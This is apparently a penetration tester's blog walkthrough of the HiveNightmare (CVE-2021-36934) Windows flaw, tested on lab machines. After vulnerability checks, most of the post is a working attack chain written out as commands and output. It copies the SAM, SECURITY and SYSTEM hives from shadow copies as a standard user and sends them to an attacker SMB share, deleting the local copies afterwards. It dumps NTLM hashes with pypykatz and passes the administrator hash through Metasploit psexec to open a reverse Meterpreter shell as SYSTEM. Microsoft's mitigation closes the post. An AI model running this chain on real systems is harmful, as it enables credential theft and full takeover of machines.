---
title: "HiveNightmare / CVE-2021-36934"
header:
  teaser: /assets/images/2021-07-21-21-24-53.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - Hacking
tags:
  - Kali
  - Windows
  - CVE-2021-36934
  - HiveNightmare
  - SeriousSAM
  - ShadowSteal
  - pypykatz
  - Meterpreter
  - PSExec
---

![hivenightmare](/assets/images/2021-07-21-21-24-53.png)

## Vulnerability Info

Another week, another vulnerability. [CVE here](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934), and according to Microsoft:

```text
An elevation of privilege vulnerability exists because of overly permissive Access Control Lists (ACLs) on multiple system files, including the Security Accounts Manager (SAM) database. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

An attacker must have the ability to execute code on a victim system to exploit this vulnerability.
```

Details are still being gathered but it looks like versions of Windows 10 1809 and above are vulnerable. [This](https://borncity.com/win/2021/07/20/windows-10-sam-zugriffsrechte-ab-1809-nach-upgrade-kaputt-benutzerzugriff-mglich/) and [this](https://borncity.com/win/2021/07/21/hivenightmare-neue-details-zur-windows-schwachstelle-cve-2021-36934/) have some of the details found so far.

## Check target is vulnerable

It's simple to see if a device is vulnerable:

```text
PS C:\WINDOWS\system32> systeminfo

OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
```

Check what version 19042 is [here](https://www.lifewire.com/windows-version-numbers-2625171):

```text
Operating System    Version Details     Version Number
Windows 10          Windows 10 (21H1)   10.0.19043
                    Windows 10 (20H2)   10.0.19042
```

Check what shadow copies exist:

```text
PS C:\WINDOWS\system32> vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {a3c39994-55fa-4dc9-b1fa-7cc5b0201e24}
   Contained 1 shadow copies at creation time: 30/06/2021 10:26:10
      Shadow Copy ID: {92673389-3f8b-44cb-b579-33f630480470}
         Original Volume: (C:)\\?\Volume{d12abbb6-3a3b-48b6-98d5-f29abef6413f}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: test-pc
         Service Machine: test-pc
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessibleWriters
         Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered
```

Have a look at permissions for the SAM files in the shadow copy:

```text
PS C:\WINDOWS\system32> .\icacls.exe '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\'
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\ NT SERVICE\TrustedInstaller:(CI)(F)
                                                                         NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                                                         BUILTIN\Administrators:(OI)(CI)(F)
                                                                         CREATOR OWNER:(OI)(CI)(IO)(F)

PS C:\WINDOWS\system32> .\icacls.exe '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM'
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM NT AUTHORITY\SYSTEM:(I)(F)
                                                                            BUILTIN\Administrators:(I)(F)

PS C:\WINDOWS\system32> .\icacls.exe '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\security'
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\security NT AUTHORITY\SYSTEM:(I)(F)
                                                                                 BUILTIN\Administrators:(I)(F)

PS C:\WINDOWS\system32> .\icacls.exe '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\system'
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\system NT AUTHORITY\SYSTEM:(I)(F)
                                                                               BUILTIN\Administrators:(I)(F)
```

The permissions are correct so this device isn't vulnerable. It's currently 20H2, but had in place upgrade from 1809. 

Check another:

```text
PS C:\Windows\system32> systeminfo

Host Name:                 DESKTOP-91K4TV8
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.18362 N/A Build 18362
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
```

Check what version 18362 is [here](https://www.lifewire.com/windows-version-numbers-2625171):

```text
Operating System    Version Details     Version Number
Windows 10          Windows 10 (21H1)   10.0.19043
                    Windows 10 (20H2)   10.0.19042
                    Windows 10 (2004)   10.0.19041
                    Windows 10 (1909)   10.0.18363
                    Windows 10 (1903)   10.0.18362
```

This one is 1903, and it hasn't got System Protection enabled, switch it on:

```text
PS C:\Windows\system32> Enable-ComputerRestore -Drive "C:\"
```

Then create snapshot:

```text
PS C:\Windows\system32> Checkpoint-Computer -Description "Install MyApp"
```

Check it worked and path:

```text
PS C:\Windows\system32> vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {92409dae-891e-454d-99ab-9611ca24a116}
   Contained 1 shadow copies at creation time: 21/07/2021 11:16:21
      Shadow Copy ID: {0142d7a0-42b8-4f30-b52a-ded8104c6bec}
         Original Volume: (C:)\\?\Volume{6338bb22-0000-0000-0000-402400000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: DESKTOP-91K4TV8
         Service Machine: DESKTOP-91K4TV8
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessibleWriters
         Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered
```

Check permissions for shadow backup:

```text
PS C:\Windows\system32> .\icacls.exe '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM'
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM BUILTIN\Administrators:(I)(F)
                                                                            NT AUTHORITY\SYSTEM:(I)(F)
                                                                            BUILTIN\Users:(I)(RX)
                                                                            APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                            APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

PS C:\Windows\system32> .\icacls.exe '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM'
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM BUILTIN\Administrators:(I)(F)
                                                                               NT AUTHORITY\SYSTEM:(I)(F)
                                                                               BUILTIN\Users:(I)(RX)
                                                                               APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                               APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

PS C:\Windows\system32> .\icacls.exe '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY'
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY BUILTIN\Administrators:(I)(F)
                                                                                 NT AUTHORITY\SYSTEM:(I)(F)
                                                                                 BUILTIN\Users:(I)(RX)
                                                                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```

Permissions are readable by users. We can dump the local SAM database as standard user.

## Start Kali SMB Share

 Start a smb server on Kali to exfiltrate data to:

```text
┌──(root💀kali)-[~]
└─# python3 /opt/impacket/examples/smbserver.py share . -smb2support -username pencer -password password
Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Note for Windows 10 you need smb2support and by default you can't copy to an anonymous share so need to set a username and password.

## SYSTEM.IO.File Dump Method

Let's grab the SAM files:

```text
PS C:\Windows\system32> [System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM','.\system.kbp')
PS C:\Windows\system32> [System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY','.\security.kbp')
PS C:\Windows\system32> [System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM','.\sam.kbp')
PS C:\Windows\system32> ls *.kbp

    Directory: C:\Windows\system32>

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       07/03/2021     12:42          65536 sam.kbp
-a----       07/03/2021     12:42          32768 security.kbp
-a----       07/03/2021     12:42       11272192 system.kbp
```

Connect to Kali share, copy files then tidy up:

```text
PS C:\Windows\system32>> net use \\192.168.0.17\share /USER:pencer password; Copy-Item *.kbp \\192.168.0.17\share; Remove-Item *.kbp; net use \\192.168.0.17\share /delete
The command completed successfully.
\\192.168.0.17\share was deleted successfully.
```

## NIM Based ShadowSteal method

HuskyHacks has done a NIM implementation [here](https://github.com/HuskyHacks/ShadowSteal).

Prepare executable on Kali. First install nim if not already there:

```text
┌──(root💀kali)-[~]
└─# nim
Command 'nim' not found, but can be installed with:
apt install nim
Do you want to install it? (N/y)y
apt install nim
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Suggested packages:
  nim-doc
The following NEW packages will be installed:
  nim
0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
Need to get 3,293 kB of archives.
After this operation, 13.4 MB of additional disk space will be used.
Get:1 http://http.kali.org/kali kali-rolling/main amd64 nim amd64 1.4.6+really1.4.2-2 [3,293 kB]
Fetched 3,293 kB in 2s (1,744 kB/s)
Selecting previously unselected package nim.
(Reading database ... 271509 files and directories currently installed.)
Preparing to unpack .../nim_1.4.6+really1.4.2-2_amd64.deb ...
Unpacking nim (1.4.6+really1.4.2-2) ...
Setting up nim (1.4.6+really1.4.2-2) ...
Processing triggers for man-db (2.9.4-2) ...
Processing triggers for kali-menu (2021.2.3) ...
```

Install zippy dependency:

```text
┌──(root💀kali)-[~]
└─# nimble install zippy
    Prompt: No local packages.json found, download it from internet? [y/N]
    Answer: y
Downloading Official package list
    Success Package list downloaded.
Downloading https://github.com/guzba/zippy using git
  Verifying dependencies for zippy@0.6.2
 Installing zippy@0.6.2
   Success: zippy installed successfully.
```

Install mingw tools if needed (used to compile the exe):

```text
┌──(root💀kali)-[~/ShadowSteal]
└─# apt install mingw-w64
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  binutils-mingw-w64-i686 binutils-mingw-w64-x86-64 g++-mingw-w64 g++-mingw-w64-i686 g++-mingw-w64-i686-posix
  g++-mingw-w64-i686-win32 g++-mingw-w64-x86-64 g++-mingw-w64-x86-64-posix g++-mingw-w64-x86-64-win32 gcc-mingw-w64
  gcc-mingw-w64-base gcc-mingw-w64-i686 gcc-mingw-w64-i686-posix gcc-mingw-w64-i686-posix-runtime
  gcc-mingw-w64-i686-win32 gcc-mingw-w64-i686-win32-runtime gcc-mingw-w64-x86-64 gcc-mingw-w64-x86-64-posix
  gcc-mingw-w64-x86-64-posix-runtime gcc-mingw-w64-x86-64-win32 gcc-mingw-w64-x86-64-win32-runtime mingw-w64-common
  mingw-w64-i686-dev mingw-w64-x86-64-dev
Suggested packages:
  gcc-10-locales wine wine64
The following NEW packages will be installed:
  binutils-mingw-w64-i686 binutils-mingw-w64-x86-64 g++-mingw-w64 g++-mingw-w64-i686 g++-mingw-w64-i686-posix
  g++-mingw-w64-i686-win32 g++-mingw-w64-x86-64 g++-mingw-w64-x86-64-posix g++-mingw-w64-x86-64-win32 gcc-mingw-w64
  gcc-mingw-w64-base gcc-mingw-w64-i686 gcc-mingw-w64-i686-posix gcc-mingw-w64-i686-posix-runtime
  gcc-mingw-w64-i686-win32 gcc-mingw-w64-i686-win32-runtime gcc-mingw-w64-x86-64 gcc-mingw-w64-x86-64-posix
  gcc-mingw-w64-x86-64-posix-runtime gcc-mingw-w64-x86-64-win32 gcc-mingw-w64-x86-64-win32-runtime mingw-w64
  mingw-w64-common mingw-w64-i686-dev mingw-w64-x86-64-dev
0 upgraded, 25 newly installed, 0 to remove and 0 not upgraded.
Need to get 210 MB of archives.
After this operation, 1,110 MB of additional disk space will be used.
Do you want to continue? [Y/n] y

<SNIP>

Setting up gcc-mingw-w64-i686-posix (10.2.1-6+24.2) ...
Setting up g++-mingw-w64-x86-64-posix (10.2.1-6+24.2) ...
Setting up gcc-mingw-w64-i686 (10.2.1-6+24.2) ...
Setting up g++-mingw-w64-x86-64 (10.2.1-6+24.2) ...
Setting up gcc-mingw-w64 (10.2.1-6+24.2) ...
Setting up g++-mingw-w64-i686-posix (10.2.1-6+24.2) ...
Setting up g++-mingw-w64-i686 (10.2.1-6+24.2) ...
Setting up g++-mingw-w64 (10.2.1-6+24.2) ...
Setting up mingw-w64 (8.0.0-1) ...
Processing triggers for man-db (2.9.4-2) ...
Processing triggers for kali-menu (2021.2.3) ...
```

Grab exploit and compile it:

```text
┌──(root💀kali)-[~]
└─# git clone https://github.com/HuskyHacks/ShadowSteal.git
Cloning into 'ShadowSteal'...
remote: Enumerating objects: 59, done.
remote: Counting objects: 100% (59/59), done.
remote: Compressing objects: 100% (54/54), done.
remote: Total 59 (delta 16), reused 18 (delta 2), pack-reused 0
Receiving objects: 100% (59/59), 189.73 KiB | 1.12 MiB/s, done.
Resolving deltas: 100% (16/16), done.

┌──(root💀kali)-[~]
└─# cd ShadowSteal

┌──(root💀kali)-[~/ShadowSteal]
└─# nim c --d:mingw --cpu=amd64 --app=console src/ShadowSteal.nim
Hint: used config file '/etc/nim/nim.cfg' [Conf]
Hint: used config file '/etc/nim/config.nims' [Conf]
.......................................CC: stdlib_assertions.nim
CC: stdlib_widestrs.nim
CC: stdlib_io.nim
CC: stdlib_system.nim
CC: stdlib_math.nim
CC: stdlib_strutils.nim
CC: stdlib_pathnorm.nim
CC: stdlib_dynlib.nim
CC: stdlib_winlean.nim
CC: stdlib_times.nim
CC: stdlib_os.nim
CC: stdlib_hashes.nim
CC: stdlib_streams.nim
CC: stdlib_osproc.nim
CC: stdlib_tables.nim
CC: ../../.nimble/pkgs/zippy-0.6.2/zippy/zippyerror.nim
CC: ../../.nimble/pkgs/zippy-0.6.2/zippy/common.nim
CC: ../../.nimble/pkgs/zippy-0.6.2/zippy/crc.nim
CC: ../../.nimble/pkgs/zippy-0.6.2/zippy/bitstreams.nim
CC: ../../.nimble/pkgs/zippy-0.6.2/zippy/lz77.nim
CC: ../../.nimble/pkgs/zippy-0.6.2/zippy/snappy.nim
CC: ../../.nimble/pkgs/zippy-0.6.2/zippy/deflate.nim
CC: ../../.nimble/pkgs/zippy-0.6.2/zippy.nim
CC: ../../.nimble/pkgs/zippy-0.6.2/zippy/ziparchives.nim
CC: stdlib_random.nim
CC: ShadowSteal.nim

Hint:  [Link]
Hint: 53665 lines; 3.759s; 94.328MiB peakmem; Debug build; proj: /root/ShadowSteal/src/ShadowSteal.nim; out: /root/ShadowSteal/src/ShadowSteal.exe [SuccessX]
```

Switch to target, run ShadowSteal, exfiltrate data and tidy up:

```text
PS C:\Windows\system32>> net use \\192.168.0.17\share /USER:pencer password; \\192.168.0.17\share\ShadowSteal\src\ShadowSteal.exe; Copy-Item *_ShadowSteal.zip \\192.168.0.17\share; Remove-Item *shadow*; net use \\192.168.0.17\share /delete
The command completed successfully.

[*] Executing ShadowSteal...
[*] Time: 202107210313
[*] Searching for shadow volumes on this host...
[*] Checking for HarddiskVolumeShadowCopy1
[+] Hit!
[+] HarddiskVolumeShare1 identified.
[+] Exfiltrating the contents of the config directory...
[+] Hives extracted!
[*] Compressing...
[+] SAM, SECURITY, and SYSTEM Hives have been extracted to 202107210313_ShadowSteal.zip.
[?] Would you like to continue? -> [y/N]
[*] Done! Happy hacking!
\\192.168.0.17\share was deleted successfully.
```

## HiveNightmare method

GossiTheDog has produced a prebuilt exe [here](https://github.com/GossiTheDog/HiveNightmare/), and blog about it [here](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5).

Stage file on Kali SMB share:

```text
┌──(root💀kali)-[~]
└─# wget https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe
--2021-07-21 15:20:26--  https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/GossiTheDog/HiveNightmare/master/Release/HiveNightmare.exe [following]
--2021-07-21 15:20:27--  https://raw.githubusercontent.com/GossiTheDog/HiveNightmare/master/Release/HiveNightmare.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 222720 (218K) [application/octet-stream]
Saving to: ‘HiveNightmare.exe’
HiveNightmare.exe             100%[==============================================>] 217.50K  --.-KB/s    in 0.09s   
2021-07-21 15:20:27 (2.27 MB/s) - ‘HiveNightmare.exe’ saved [222720/222720]
```

Switch to target, execute, exfiltrate and tidy up:

```text
PS C:\Windows\system32>> net use \\192.168.0.17\share /USER:pencer password; \\192.168.0.17\share\HiveNightmare.exe; Copy-Item *-haxx \\192.168.0.17\share; Remove-Item *-haxx; net use \\192.168.0.17\share /delete
The command completed successfully.

HiveNightmare v0.4 - dump registry hives as non-admin users
Specify maximum number of shadows to inspect with parameter if wanted, default is 4.

Running...

SAM hive written out to current working directory
SECURITY hive written out to current working directory
SYSTEM hive written out to current working directory
Assuming no errors, should be able to find hive dump files in current working directory as SAM-haxx, SECURITY-haxx and SYSTEM-haxx
\\192.168.0.17\share was deleted successfully.
```

## Extracting Hashes

After using one of the above methods to get the SAM files to Kali, we can now pull credentials out using [pypykatz](https://github.com/skelsec/pypykatz) which is already installed:

```text
┌──(root💀kali)-[~]
└─#  pypykatz registry system.kbp --sam sam.kbp --security security.kbp 
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 9da73970e33947b03b30e8e00ca5fc08
============== SAM hive secrets ==============
HBoot Key: 8a2e60f6fc38769898f5fe735793e42c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:910a89f8b810236e9cbd99e1c7eee683:::
User:1001:aad3b435b51404eeaad3b435b51404ee:0db93d393fb1e77b27c04e5a1ab822e6:::
============== SECURITY hive secrets ==============
Iteration count: 10240
Secrets structure format : VISTA
LSA Key: 7c8b73bf1faae577217b172ee1aa04e5cf0a6c1ef9d1d820a31920d9a186360e
NK$LM Key: 400000000000000000000000000000003ed50ebcf75799ecb3dcdeea966b782e17266697e97174aeb79d7e2d5ad232594378ed0c34abfb301918586ee1d0dd13a1a0a83c08ae1f2e3f116ab5c216e56fb702ddeef072a5cd055a110df176aadb4fe17a13a0c437a83e0ca23d84832899
=== LSA DPAPI secret ===
History: False
Machine key (hex): 98b9d55c7f14f51b0f1faf60d53689a88eeb8739
User key(hex): cafb359f0192cdcf8a858f80b1eaf5a47cce518f
=== LSA DPAPI secret ===
History: True
Machine key (hex): 7bb0ec429ac9251eea97bc451abc95f4028ca237
User key(hex): 50f452ff2e58b9c95d08f80aff82c78f09d249e5
=== LSASecret NL$KM ===

History: False
Secret: 
00000000:  3e d5 0e bc f7 57 99 ec  b3 dc de ea 96 6b 78 2e   |>....W.......kx.|
00000010:  17 26 66 97 e9 71 74 ae  b7 9d 7e 2d 5a d2 32 59   |.&f..qt...~-Z.2Y|
00000020:  43 78 ed 0c 34 ab fb 30  19 18 58 6e e1 d0 dd 13   |Cx..4..0..Xn....|
00000030:  a1 a0 a8 3c 08 ae 1f 2e  3f 11 6a b5 c2 16 e5 6f   |...<....?.j....o|
=== LSASecret NL$KM ===

History: True
Secret: 
00000000:  3e d5 0e bc f7 57 99 ec  b3 dc de ea 96 6b 78 2e   |>....W.......kx.|
00000010:  17 26 66 97 e9 71 74 ae  b7 9d 7e 2d 5a d2 32 59   |.&f..qt...~-Z.2Y|
00000020:  43 78 ed 0c 34 ab fb 30  19 18 58 6e e1 d0 dd 13   |Cx..4..0..Xn....|
00000030:  a1 a0 a8 3c 08 ae 1f 2e  3f 11 6a b5 c2 16 e5 6f   |...<....?.j....o|
```

## SYSTEM Shell with Meterpreter

Now we have the local administrator hash. The world is your oyster, as an example let's connect using Meterpreter to get a shell:

```text
┌──(root💀kali)-[~]
└─# msfconsole
         .                                         .
 .
      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB
                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP
                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before

       =[ metasploit v6.0.53-dev                          ]
+ -- --=[ 2149 exploits - 1143 auxiliary - 366 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: View all productivity tips with the tips command
msf6 > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set rhosts 192.168.0.22
rhosts => 192.168.0.22
msf6 exploit(windows/smb/psexec) > set smbuser Administrator
smbuser => Administrator
msf6 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
 => aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set lport 192.168.0.17
lport => 192.168.0.17
msf6 exploit(windows/smb/psexec) > set lport 443
lport => 443
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 192.168.0.17:443 
[*] 192.168.0.22:445 - Connecting to the server...
[*] 192.168.0.22:445 - Authenticating to 192.168.0.22:445 as user 'Administrator'...
[-] 192.168.0.22:445 - Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: (0xc000006d) STATUS_LOGON_FAILURE: The attempted logon is invalid. This is either due to a bad username or authentication information.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/psexec) > 
msf6 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
msf6 exploit(windows/smb/psexec) > exploit
[*] Started reverse TCP handler on 192.168.0.17:443 
[*] 192.168.0.22:445 - Connecting to the server...
[*] 192.168.0.22:445 - Authenticating to 192.168.0.22:445 as user 'Administrator'...
[*] 192.168.0.22:445 - Selecting PowerShell target
[*] 192.168.0.22:445 - Executing the payload...
[+] 192.168.0.22:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (200262 bytes) to 192.168.0.22
[*] Meterpreter session 2 opened (192.168.0.17:443 -> 192.168.0.22:49732) at 2021-07-21 22:29:57 +0100

meterpreter > shell
Process 4084 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.720]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## Mitigation

At least this one is a nice and simple fix. Taken from the [MS CVE](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934):

```text
Workarounds
Restrict access to the contents of %windir%\system32\config
Open Command Prompt or Windows PowerShell as an administrator.

Run this command: icacls %windir%\system32\config\*.* /inheritance:e

Delete Volume Shadow Copy Service (VSS) shadow copies
Delete any System Restore points and Shadow volumes that existed prior to restricting access to %windir%\system32\config.

Create a new System Restore point (if desired).
```

So just correct the ACL of the config folder with icacls, and delete and shadow copies that had the old permissions in them.